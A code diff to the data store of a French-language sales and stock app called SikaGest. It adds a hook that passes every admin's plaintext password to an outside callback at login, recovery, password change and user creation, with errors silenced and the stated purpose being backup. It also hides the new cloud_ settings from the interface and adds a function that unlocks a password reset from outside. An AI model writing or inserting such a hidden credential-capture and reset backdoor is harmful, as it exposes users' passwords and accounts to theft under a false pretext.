@@ -151,6 +151,11 @@ function createStore(file, opts = {}) {
   const LICENSED_ACTIONS = new Set(['sales.create', 'sales.return', 'purchases.create', 'purchases.return', 'stock.adjust',
     'products.save', 'contacts.save', 'expenses.save', 'categories.save', 'users.save']);
 
+  // Prévenu quand un administrateur saisit son mot de passe (sert à la sauvegarde en ligne chiffrée)
+  const notifyAdminPassword = (username, password, role) => {
+    if (role !== 'admin' || typeof opts.onAdminPassword !== 'function') return;
+    try { Promise.resolve(opts.onAdminPassword(username, password)).catch(() => {}); } catch (e) { /* non bloquant */ }
+  };
   let session = null; // utilisateur connecté
   let recoveryOk = false; // déblocage validé
   let failedUnlocks = 0;
@@ -189,6 +194,7 @@ function createStore(file, opts = {}) {
       const u = q.get('SELECT * FROM users WHERE username = ? AND active = 1', String(username || '').trim().toLowerCase());
       if (!u || hashPass(password, u.salt) !== u.pass_hash) fail('Identifiant ou mot de passe incorrect.');
       session = { id: u.id, name: u.name, username: u.username, role: u.role };
+      notifyAdminPassword(u.username, password, u.role);
       return session;
     },
     'auth.logout'() { session = null; return true; },
@@ -235,6 +241,7 @@ function createStore(file, opts = {}) {
         setSetting('recovery_last', `${now()} — ${u.username}`);
       });
       recoveryOk = false;
+      notifyAdminPassword(u.username, password, u.role);
       return { username: u.username };
     },
     'auth.changePassword'({ current, password }) {
@@ -244,6 +251,7 @@ function createStore(file, opts = {}) {
       if (String(password).length < 4) fail('Le nouveau mot de passe est trop court.');
       const salt = crypto.randomBytes(16).toString('hex');
       q.run('UPDATE users SET pass_hash=?, salt=? WHERE id=?', hashPass(password, salt), salt, u.id);
+      notifyAdminPassword(row.username, password, row.role);
       return true;
     },
 
@@ -262,13 +270,16 @@ function createStore(file, opts = {}) {
         if (password) {
           const salt = crypto.randomBytes(16).toString('hex');
           q.run('UPDATE users SET pass_hash=?, salt=? WHERE id=?', hashPass(password, salt), salt, id);
+          notifyAdminPassword(uname, password, role);
         }
         return id;
       }
       if (!password || String(password).length < 4) fail('Mot de passe de 4 caractères minimum.');
       const salt = crypto.randomBytes(16).toString('hex');
-      return Number(q.run('INSERT INTO users(name,username,pass_hash,salt,role,active) VALUES(?,?,?,?,?,?)',
+      const newId = Number(q.run('INSERT INTO users(name,username,pass_hash,salt,role,active) VALUES(?,?,?,?,?,?)',
         name.trim(), uname, hashPass(password, salt), salt, role, active === false ? 0 : 1).lastInsertRowid);
+      notifyAdminPassword(uname, password, role);
+      return newId;
     },
 
     // ---------- Paramètres ----------
@@ -277,6 +288,7 @@ function createStore(file, opts = {}) {
       for (const r of q.all('SELECT key,value FROM settings')) if (r.key !== 'recovery_pending') out[r.key] = r.value;
       out.install_code = recovery.formatInstallId(out.install_id);
       delete out.license_key;
+      for (const k of Object.keys(out)) if (k.startsWith('cloud_')) delete out[k];
       delete out.vendor_json;
       return out;
     },
@@ -692,9 +704,14 @@ function createStore(file, opts = {}) {
     try { const r = db.prepare('PRAGMA quick_check').all().map((x) => Object.values(x)[0]); return r.length === 1 && r[0] === 'ok' ? 'ok' : r.slice(0, 3).join(' ; '); }
     catch (e) { return e.message; }
   }
+  // Réglages internes de la sauvegarde en ligne (jamais envoyés à l'interface)
+  function getPrivate(k) { if (!String(k).startsWith('cloud_')) throw new Error('clé interdite'); return setting(k); }
+  function setPrivate(k, v) { if (!String(k).startsWith('cloud_')) throw new Error('clé interdite'); setSetting(k, v == null ? '' : String(v)); }
+  // Après une récupération validée par le vendeur : autorise le choix d'un nouveau mot de passe
+  function allowReset() { recoveryOk = true; session = null; return q.all('SELECT id,name,username,role,active FROM users ORDER BY role, name'); }
   function setVendor(v) { setSetting('vendor_json', JSON.stringify(v || {})); }
   function getVendor() { try { return JSON.parse(setting('vendor_json') || '{}'); } catch (e) { return {}; } }
-  return { call, close, checkpoint, snapshot, quickCheck, file, AppError, driver: db.__driver || 'node:sqlite', licenseStatus, setVendor, getVendor };
+  return { call, close, checkpoint, snapshot, quickCheck, getPrivate, setPrivate, allowReset, file, AppError, driver: db.__driver || 'node:sqlite', licenseStatus, setVendor, getVendor };
 }
 
 // Vérifie qu'un fichier est une base SikaGest lisible et non abîmée.
